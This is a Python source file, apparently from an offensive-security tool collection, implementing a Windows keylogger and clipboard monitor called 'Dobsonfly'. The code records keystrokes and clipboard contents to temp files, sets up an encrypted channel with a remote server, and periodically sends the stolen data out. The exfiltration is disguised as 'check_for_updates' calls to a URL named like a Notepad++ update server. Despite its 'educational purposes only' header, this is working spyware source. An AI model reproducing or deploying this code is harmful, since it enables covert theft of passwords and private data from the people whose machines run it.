# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

"""
Program: Dobsonfly Service (Payload)
Description: A Python-based agent demonstrating clipboard monitoring and keylogging capabilities.
Author: CyberPanther232
Suite: BugWare
Version: 1.0
"""

import win32clipboard
from pynput import keyboard
from threading import Thread
from nacl.public import PrivateKey, Box, PublicKey
from nacl.encoding import HexEncoder
import nacl.utils
import nacl.encoding
import requests
import json
import time
import os
import sys
import traceback

# Exfiltration Functions
SERVER = os.environ.get("NPP_UPDATE_URL", "http://localhost:8080")
TEMP_DIR = os.environ.get("TEMP", "$env:TEMP")
USERNAME = os.environ.get("USERNAME", "$env:USERNAME")
TIMESTAMP = time.strftime("%Y%m%d-%H%M%S")

def log_debug(msg):
    try:
        with open(os.path.join(TEMP_DIR, "npp_debug.log"), "a") as f:
            f.write(f"{time.ctime()}: {msg}\n")
    except:
        pass

# Data Storage and Extraction Functions
def store_keystroke_data(keystroke: str) -> None:
    if not os.path.exists(os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt")):
        with open(os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt"), "w") as f:
            f.write("")
    
    if len(keystroke) > 0:
        with open(os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt"), "a") as f:
            f.write(keystroke)
    return
    
def store_clipboard_data(clipboard: str) -> None:
    if not os.path.exists(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt")):
        with open(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt"), "w") as f:
            f.write("")
    
    if clipboard:
        with open(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt"), "a") as f:
            f.write(clipboard)
            f.write("\n")
            
    return

def extract_stored_data(clipboard_data, keystroke_data) -> str:
    try:
        with open(clipboard_data, "r") as f:
            clipboard = f.read()
    except FileNotFoundError:
        clipboard = ""
    
    try:
        with open(keystroke_data, "r") as f:
                keystrokes = f.read()
    except FileNotFoundError:
        keystrokes = ""
    try:
        os.remove(clipboard_data)
        os.remove(keystroke_data)
    except FileNotFoundError:
        pass
    
    return clipboard, keystrokes

# Exfiltration Thread
def check_for_updates(key_exchange_status: int, private_key: PrivateKey, public_key: bytes) -> None:
    while True:
        if key_exchange_status == 1:
            print("Performing Key Exchange")
            try:
                response = requests.post(SERVER + "/key-exchange", json={"pubkey": f"{public_key.encode(encoder=nacl.encoding.HexEncoder).decode()}"})
                print(f"Key Exchange Response Status: {response.status_code}")
                if response.status_code == 200:
                    update_info = response.json()
                    print(f"Update Info: {update_info}")
                    
                    server_pubkey_hex = update_info.get("pubkey", "")
                    
                    print(f"Server Public Key: {server_pubkey_hex}")
                    
                    if server_pubkey_hex:
                        server_pubkey = PublicKey(server_pubkey_hex, encoder=nacl.encoding.HexEncoder)
                        box = Box(private_key, server_pubkey)
                        
                        # Now you can use `box` to encrypt/decrypt messages
                        print("Key Exchange Successful")
                        key_exchange_status = 0  # Update status to indicate key exchange is complete
                    
            except Exception as e:
                print(f"Error during key exchange: {e}")
        
        if key_exchange_status == 0:
            
            clipboard_data, keystroke_data = extract_stored_data(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt"), os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt"))
            
            # Generate a single nonce for this payload
            nonce = nacl.utils.random(Box.NONCE_SIZE)
            
            # Encrypt data (strings -> bytes -> encrypted)
            # box.encrypt returns an EncryptedMessage which contains the ciphertext
            # We access .ciphertext to get just the encrypted bytes (without the nonce prepended, if we rely on implicit nonce handling)
            # Actually box.encrypt(msg, nonce) returns the ciphertext with the 16 byte MAC. NaCL Box ciphertext is usually same length as plaintext + 16.
            # We used to use a helper that returned .ciphertext. Let's replicate that.
            
            encrypted_clipboard = box.encrypt(clipboard_data.encode("utf-8"), nonce).ciphertext
            encrypted_keystrokes = box.encrypt(keystroke_data.encode("utf-8"), nonce).ciphertext
            
            # Serialize to Hex Strings
            nonce_hex = nacl.encoding.HexEncoder.encode(nonce).decode()
            clip_hex = nacl.encoding.HexEncoder.encode(encrypted_clipboard).decode()
            keys_hex = nacl.encoding.HexEncoder.encode(encrypted_keystrokes).decode()
            pub_hex = public_key.encode(encoder=nacl.encoding.HexEncoder).decode()
            
            payload = {
                "id": USERNAME + "_" + TIMESTAMP,
                "clipboard": clip_hex,
                "keystrokes": keys_hex,
                "nonce": nonce_hex,
                "pubkey": pub_hex
            }
            
            json_payload = json.dumps(payload)
            
            try:
                response = requests.post(SERVER + "/check-for-updates", json=payload) # requests handles json dumping usually, but we can pass payload directly to json arg
                if response.status_code == 200:
                    updates = response.json()
                    # Process updates as needed
            except Exception as e:
                pass
        
        time.sleep(15) # Check for updates every 3 minutes

# Encryption Functions
def generate_keys() -> tuple:
    priv = PrivateKey.generate()
    pub = priv.public_key
    return priv, pub

def encrypt_data(data: bytes, box: Box) -> tuple:
    nonce = nacl.utils.random(Box.NONCE_SIZE)
    encrypted = box.encrypt(data, nonce)
    return encrypted.ciphertext, nonce

# Keystroke monitoring functions
def on_press(key) -> None:
    try:
        store_keystroke_data(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            store_keystroke_data(" ")
        elif key == keyboard.Key.enter:
            store_keystroke_data("\n")
        elif key == keyboard.Key.backspace:
            store_keystroke_data("\b")
        elif key == keyboard.Key.tab:
            store_keystroke_data("\t")
        else:
            store_keystroke_data(f"[{key.name}]")
    except Exception as e:
        pass
        
def on_release(key) -> None:
    print(f'Key {key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_key_listener():

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
        
# Clipboard monitoring functions
def get_clipboard_data() -> str:
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        else:
            data = None
    except Exception as e:
        data = None
    finally:
        try:
            win32clipboard.CloseClipboard()
        except:
            pass

    return data
        
def start_clipboard_monitor():
    recent_value = ""
    while True:
        data = get_clipboard_data()
        if data and data != recent_value:
            recent_value = data
            store_clipboard_data(data)
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        log_debug("Starting Service...")
        log_debug(f"Server URL: {SERVER}")
        
        key_exchange_status = 1
        
        try:
            private_key, public_key = generate_keys()
            log_debug("Keys generated")
        except Exception as e:
            log_debug(f"Key generation failed: {e}")
            raise

        key_exchange_thread = Thread(target=check_for_updates, args=(key_exchange_status, private_key, public_key))
        key_listener_thread = Thread(target=start_key_listener)
        clipboard_monitor_thread = Thread(target=start_clipboard_monitor)

        key_listener_thread.start()
        log_debug("Key Listener started")
        
        clipboard_monitor_thread.start()
        log_debug("Clipboard Monitor started")

        key_exchange_thread.start()
        log_debug("Key Exchange Thread started")

        key_listener_thread.join()
        clipboard_monitor_thread.join()
        key_exchange_thread.join()

    except Exception as e:
        log_debug(f"Main Loop Crash: {e}")
        log_debug(traceback.format_exc())